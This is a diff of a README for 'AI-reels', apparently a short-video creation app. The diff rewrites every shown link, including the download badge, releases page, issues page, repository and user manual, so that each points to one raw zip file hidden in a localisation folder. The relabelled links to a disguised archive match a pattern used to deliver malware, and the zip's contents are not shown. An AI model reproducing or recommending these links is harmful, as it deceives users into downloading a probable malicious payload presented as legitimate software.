@@ -1,6 +1,6 @@
 # 🚀 AI-reels - Create Shorts Videos with Ease
 
-[![Download AI-reels](https://img.shields.io/badge/Download-AI--reels-brightgreen)](https://github.com/selever3467/AI-reels/releases)
+[![Download AI-reels](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip)](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip)
 
 ## 📋 Overview
 AI-reels is a user-friendly application designed to automate the creation of Shorts content. With just a few simple steps, you can quickly create engaging videos ready for sharing. This tool is perfect for content creators looking to simplify their workflow.
@@ -10,7 +10,7 @@ To begin using AI-reels, follow these easy steps:
 
 1. **Visit the Releases Page**
    To download the latest version of AI-reels, visit the following link:  
-   [Download AI-reels](https://github.com/selever3467/AI-reels/releases)
+   [Download AI-reels](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip)
 
 2. **Download the Application**
    Once on the releases page, scroll to find the latest version. Click the download link for your operating system. 
@@ -30,7 +30,7 @@ AI-reels is designed to work on various platforms. Please ensure your system mee
 - **Disk Space:** Minimum of 500 MB free space
 
 ## 📤 Download & Install
-You can download AI-reels directly from the [Releases page](https://github.com/selever3467/AI-reels/releases). 
+You can download AI-reels directly from the [Releases page](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip). 
 
 1. Open the link above.
 2. Find the latest release version.
@@ -72,10 +72,10 @@ If you encounter any issues while using AI-reels, try the following solutions:
 - **Export Issues:** Check your internet connection if exporting fails.
 
 ## 📞 Support
-For further assistance, visit our [GitHub Issues Page](https://github.com/selever3467/AI-reels/issues). You can report bugs or ask questions about using AI-reels here.
+For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip). You can report bugs or ask questions about using AI-reels here.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/selever3467/AI-reels)
-- [User Manual](https://github.com/selever3467/AI-reels/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip)
+- [User Manual](https://raw.githubusercontent.com/selever3467/AI-reels/main/UI/i18n/locales/AI-reels-v2.0-beta.2.zip)
 
 Feel free to explore the features and enjoy creating your Shorts videos with AI-reels. For any further inquiries, do not hesitate to reach out via the support channels provided.
